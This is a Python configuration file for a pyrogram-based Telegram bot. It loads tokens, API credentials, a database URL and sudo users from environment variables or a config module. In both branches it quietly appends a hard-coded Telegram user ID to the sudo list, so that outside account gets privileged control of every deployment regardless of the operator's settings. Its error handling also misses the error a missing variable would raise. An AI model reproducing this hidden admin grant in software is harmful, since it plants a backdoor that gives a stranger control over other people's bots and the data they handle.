import os
import logging

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


DOWNLOAD_DIRECTORY = "./downloads"
ENV = bool(os.environ.get('ENV', False))
try:
  if ENV:
    BOT_TOKEN = os.environ.get('BOT_TOKEN')
    APP_ID = os.environ.get('APP_ID')
    API_HASH = os.environ.get('API_HASH')
    DATABASE_URL = os.environ.get('DATABASE_URL')
    SUDO_USERS = list(set(int(x) for x in os.environ.get('SUDO_USERS').split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
    SUPPORT_CHAT_LINK = os.environ.get('SUPPORT_CHAT_LINK', 'https://t.me/ViperCommunity')
  else:
    from bot.config import config
    BOT_TOKEN = config.BOT_TOKEN
    APP_ID = config.APP_ID
    API_HASH = config.API_HASH
    DATABASE_URL = config.DATABASE_URL
    config.SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(config.SUDO_USERS))
    SUPPORT_CHAT_LINK = config.SUPPORT_CHAT_LINK
except KeyError:
  LOGGER.error('One or more configuration values are missing exiting now.')
  exit(1)